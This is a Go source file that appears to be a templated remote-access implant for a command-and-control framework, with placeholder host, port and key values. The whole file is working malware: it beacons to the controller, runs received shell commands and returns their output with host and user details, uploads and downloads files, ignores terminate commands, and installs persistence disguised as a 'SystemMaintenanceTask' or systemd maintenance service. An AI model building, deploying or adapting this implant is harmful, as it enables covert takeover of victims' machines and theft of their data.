package main

import (
    "bytes"
    "context"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/tls"
    "encoding/base64"
    "encoding/hex"
    "encoding/json"
    "errors"
    "fmt"
    mathrand "math/rand"
    "io"
    "mime/multipart"
    "net"
    "net/http"
    "os"
    "os/exec"
    "os/user"
    "path/filepath"
    "runtime"
    "strconv"
    "strings"
    "time"
)

const (
    C2_URL     = "https://{lhost}:{lport}"
    CLIENT_ID  = "{line}"
    USERNAME   = "{username}"
    PASSWORD   = "{password}"
    SLEEP      = {sleep} * time.Second
    MALEABLE   = "{maleable}"
    USER_AGENT = "{useragent}"
    MAX_RETRIES = 3
    STEALTH    = "{stealth}"
)

var stealthModeEnabled bool 

type Aes256Key struct {
    Key []byte
}

type PacketEncryptionContext struct {
    AesKey  *Aes256Key
    Valid   bool
    Enabled bool
}

var encryptionCtx *PacketEncryptionContext

func initEncryptionContext(keyHex string) *PacketEncryptionContext {
    keyBytes, err := hex.DecodeString(keyHex)
    if err != nil {
        return nil
    }
    return &PacketEncryptionContext{
        AesKey:  &Aes256Key{Key: keyBytes},
        Valid:   true,
        Enabled: true,
    }
}

// Función para inicializar el modo sigiloso
func initStealthMode() {
    if STEALTH == "True" || STEALTH == "true" {
        stealthModeEnabled = true
        fmt.Println("[INFO] Stealth mode initialized as ENABLED")
    } else {
        stealthModeEnabled = false
        fmt.Println("[INFO] Stealth mode initialized as DISABLED")
    }
}

// Función para manejar comandos stealth_on/off
func handleStealthCommand(command string) {
    switch command {
    case "stealth_on":
        stealthModeEnabled = true
        fmt.Println("[INFO] Stealth mode ENABLED by command")
    case "stealth_off":
        stealthModeEnabled = false
        fmt.Println("[INFO] Stealth mode DISABLED by command")
    default:
        // No hacer nada si el comando no es relevante
    }
}

func globalRecover() {
    if r := recover(); r != nil {
        fmt.Printf("[RECOVER] Critical error: %v\n", r)
        restartClient()
    }
}

func restartClient() {
    executable, _ := os.Executable()
    cmd := exec.Command(executable)
    cmd.Start()
    os.Exit(1)
}

func ensurePersistence() error {
    executable, err := os.Executable()
    if err != nil {
        return fmt.Errorf("failed to get executable path: %w", err)
    }

    // Crear una tarea programada en Windows
    if runtime.GOOS == "windows" {
        taskName := "SystemMaintenanceTask"
        taskCmd := fmt.Sprintf(`schtasks /create /tn "%s" /tr "%s" /sc daily /f`, taskName, executable)
        return exec.Command("cmd", "/C", taskCmd).Run()
    }

    // Crear un servicio en Linux
    if runtime.GOOS == "linux" {
        serviceContent := fmt.Sprintf(`
[Unit]
Description=System Maintenance Service

[Service]
ExecStart=%s
Restart=always
User=%s

[Install]
WantedBy=multi-user.target
`, executable, os.Getenv("USER"))

        servicePath := "/etc/systemd/system/system-maintenance.service"
        err := os.WriteFile(servicePath, []byte(serviceContent), 0644)
        if err != nil {
            return err
        }
        return exec.Command("systemctl", "enable", "system-maintenance").Run()
    }

    return nil
}

func EncryptPacket(ctx *PacketEncryptionContext, packet []byte) ([]byte, error) {
    block, err := aes.NewCipher(ctx.AesKey.Key)
    if err != nil {
        return nil, err
    }

    iv := make([]byte, aes.BlockSize)
    if _, err := rand.Read(iv); err != nil {
        return nil, err
    }

    encryptedData := make([]byte, aes.BlockSize+len(packet))
    copy(encryptedData, iv)

    stream := cipher.NewCFBEncrypter(block, iv)
    stream.XORKeyStream(encryptedData[aes.BlockSize:], packet)

    return encryptedData, nil
}

func DecryptPacket(ctx *PacketEncryptionContext, encryptedData []byte) ([]byte, error) {
    block, err := aes.NewCipher(ctx.AesKey.Key)
    if err != nil {
        return nil, err
    }

    if len(encryptedData) < aes.BlockSize {
        return nil, errors.New("encrypted data too short")
    }

    iv := encryptedData[:aes.BlockSize]
    encryptedData = encryptedData[aes.BlockSize:]

    stream := cipher.NewCFBDecrypter(block, iv)
    stream.XORKeyStream(encryptedData, encryptedData)

    return encryptedData, nil
}

func sendRequest(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{
        Transport: tr,
        Timeout:   30 * time.Second,
    }

    var req *http.Request
    var err error

    if filePath != "" {
        file, err := os.Open(filePath)
        if err != nil {
            return nil, fmt.Errorf("file open error: %w", err)
        }
        defer file.Close()

        bodyBuffer := &bytes.Buffer{}
        writer := multipart.NewWriter(bodyBuffer)
        part, err := writer.CreateFormFile("file", filepath.Base(filePath))
        if err != nil {
            return nil, fmt.Errorf("multipart create error: %w", err)
        }

        if _, err = io.Copy(part, file); err != nil {
            return nil, fmt.Errorf("file copy error: %w", err)
        }
        writer.Close()

        req, err = http.NewRequestWithContext(ctx, method, url, bodyBuffer)
        if err != nil {
            return nil, fmt.Errorf("request creation error: %w", err)
        }
        req.Header.Set("Content-Type", writer.FormDataContentType())
    } else {
        encryptedBody, err := EncryptPacket(encryptionCtx, []byte(body))
        if err != nil {
            return nil, fmt.Errorf("encryption error: %w", err)
        }
        base64Body := base64.StdEncoding.EncodeToString(encryptedBody)
        req, err = http.NewRequestWithContext(ctx, method, url, strings.NewReader(base64Body))
        if err != nil {
            return nil, fmt.Errorf("request creation error: %w", err)
        }
        req.Header.Set("Content-Type", "text/plain")
    }

    //req.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(USERNAME+":"+PASSWORD)))
    req.Header.Set("User-Agent", USER_AGENT)

    resp, err := client.Do(req)
    if err != nil {
        return nil, fmt.Errorf("request failed: %w", err)
    }

    if resp.StatusCode != http.StatusOK {
        defer resp.Body.Close()
        errorBody, _ := io.ReadAll(resp.Body)
        return nil, fmt.Errorf("server error %d: %s", resp.StatusCode, string(errorBody))
    }

    if resp.Body != nil {
        defer resp.Body.Close()
        rawResponse, err := io.ReadAll(resp.Body)
        if err != nil {
            return nil, fmt.Errorf("response read error: %w", err)
        }

        encryptedResponse, err := base64.StdEncoding.DecodeString(string(rawResponse))


        decryptedResponse, err := DecryptPacket(encryptionCtx, encryptedResponse)
        if err != nil {
            return nil, fmt.Errorf("decryption error: %w", err)
        }

        resp.Body = io.NopCloser(bytes.NewReader(decryptedResponse))
    }

    return resp, nil
}

func retryRequest(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
    for i := 0; i < MAX_RETRIES; i++ {
        resp, err := sendRequest(ctx, url, method, body, filePath)
        if err == nil {
            return resp, nil
        }
        fmt.Printf("[RETRY] Attempt %d/%d: %v\n", i+1, MAX_RETRIES, err)
        select {
        case <-ctx.Done():
            return nil, ctx.Err()
        case <-time.After(SLEEP):
        }
    }
    return nil, fmt.Errorf("max retries reached")
}

func executeCommandWithRetry(shellCommand []string, command string) (string, error) {
    ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
    defer cancel()

    for i := 0; i < MAX_RETRIES; i++ {
        cmd := exec.CommandContext(ctx, shellCommand[0], shellCommand[1], command)
        var out bytes.Buffer
        cmd.Stdout = &out
        cmd.Stderr = &out

        err := cmd.Run()
        if err == nil {
            return out.String(), nil
        }

        fmt.Printf("[CMD RETRY] Attempt %d/%d: %v\n", i+1, MAX_RETRIES, err)
        time.Sleep(2 * time.Second)
    }
    return "", fmt.Errorf("command failed after %d attempts", MAX_RETRIES)
}

func getShellCommand() []string {
    osName := runtime.GOOS
    switch osName {
    case "windows":
        if _, err := exec.LookPath("powershell"); err == nil {
            return []string{"powershell", "-Command"}
        }
        return []string{"cmd", "/C"}
    case "linux", "darwin":
        if _, err := exec.LookPath("bash"); err == nil {
            return []string{"bash", "-c"}
        }
        return []string{"sh", "-c"}
    default:
        return []string{"sh", "-c"}
    }
}

func calculateJitteredSleep(baseSleep time.Duration, minJitterPercentage, maxJitterPercentage float64) time.Duration {
	jitterPercentage := minJitterPercentage + mathrand.Float64()*(maxJitterPercentage-minJitterPercentage)
	jitterRange := time.Duration(float64(baseSleep) * jitterPercentage)
	jitter := time.Duration(mathrand.Float64() * float64(jitterRange))
	jitteredSleep := baseSleep + jitter
	return jitteredSleep
}

func main() {
    defer globalRecover()
	mathrand.Seed(time.Now().UnixNano())
	baseSleepTime := SLEEP
	minJitterPercentage := 0.1
	maxJitterPercentage := 0.3
    keyHex := "{key}"

    initStealthMode()

    encryptionCtx = initEncryptionContext(keyHex)
    if encryptionCtx == nil {
        fmt.Println("[FATAL] Failed to initialize encryption")
        time.Sleep(30 * time.Second)
        restartClient()
    }

    shellCommand := getShellCommand()
    baseCtx := context.Background()
    ensurePersistence()
    for {
        func() {

            defer globalRecover()
            
            if stealthModeEnabled {
                fmt.Println("[DEBUG] Stealth mode is active. Skipping activity.")
                return
            }

            ctx, cancel := context.WithTimeout(baseCtx, 180*time.Second)
            defer cancel()

            resp, err := retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "GET", "", "")
            if err != nil {
                fmt.Printf("[ERROR] Main request failed: %v\n", err)
                return
            }

            body, err := io.ReadAll(resp.Body)
            if err != nil {
                fmt.Printf("[ERROR] Failed to read response: %v\n", err)
                return
            }

            command := strings.TrimSpace(string(body))
            if command == "" {
                return
            }
            // Manejar comandos stealth_on/off
            handleStealthCommand(command)
            // Continuar con el procesamiento normal si no es un comando de stealth
            if !strings.Contains(command, "stealth") {
                switch {
                case strings.HasPrefix(command, "download:"):
                    handleDownload(ctx, command)
                case strings.HasPrefix(command, "upload:"):
                    handleUpload(ctx, command)
                case strings.Contains(command, "terminate"):
                    fmt.Println("[INFO] Ignoring terminate command")
                default:
                    handleCommand(ctx, command, shellCommand)
                }
            }
        }()
		sleepTime := calculateJitteredSleep(baseSleepTime, minJitterPercentage, maxJitterPercentage)
		time.Sleep(sleepTime)
    }
}

func handleDownload(ctx context.Context, command string) {
    defer globalRecover()
    filePath := strings.TrimPrefix(command, "download:")
    fileURL := C2_URL + MALEABLE + "/download/" + filePath

    resp, err := retryRequest(ctx, fileURL, "GET", "", "")
    if err != nil {
        fmt.Printf("[ERROR] Download failed: %v\n", err)
        return
    }

    fileData, err := io.ReadAll(resp.Body)
    if err != nil {
        fmt.Printf("[ERROR] Failed to read downloaded file: %v\n", err)
        return
    }

    err = os.WriteFile(filepath.Base(filePath), fileData, 0644)
    if err != nil {
        fmt.Printf("[ERROR] Failed to write file: %v\n", err)
    }
}

func handleUpload(ctx context.Context, command string) {
    defer globalRecover()
    filePath := strings.TrimPrefix(command, "upload:")
    resp, err := retryRequest(ctx, C2_URL+MALEABLE+"/upload", "POST", "", filePath)
    if err != nil {
        fmt.Printf("[ERROR] Upload failed: %v\n", err)
        return
    }
    
    if resp.StatusCode != http.StatusOK {
        fmt.Printf("[ERROR] Upload failed with status: %d\n", resp.StatusCode)
    }
}

func handleCommand(ctx context.Context, command string, shellCommand []string) {
    defer globalRecover()
    output, err := executeCommandWithRetry(shellCommand, command)
    if err != nil {
        output = fmt.Sprintf("Command execution error: %v", err)
    }

    pid := os.Getpid()
    hostname, _ := os.Hostname()
    ips := getIPs()
    currentUser, _ := user.Current()

    jsonData, _ := json.Marshal(map[string]string{
        "output":   output,
        "client":   runtime.GOOS,
        "command":  command,
        "pid":      strconv.Itoa(pid),
        "hostname": hostname,
        "ips":      strings.Join(ips, ", "),
        "user":     currentUser.Username,
    })

    retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", string(jsonData), "")
}

func getIPs() []string {
    var ips []string
    addrs, _ := net.InterfaceAddrs()
    for _, addr := range addrs {
        if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
            ips = append(ips, ipnet.IP.String())
        }
    }
    return ips
}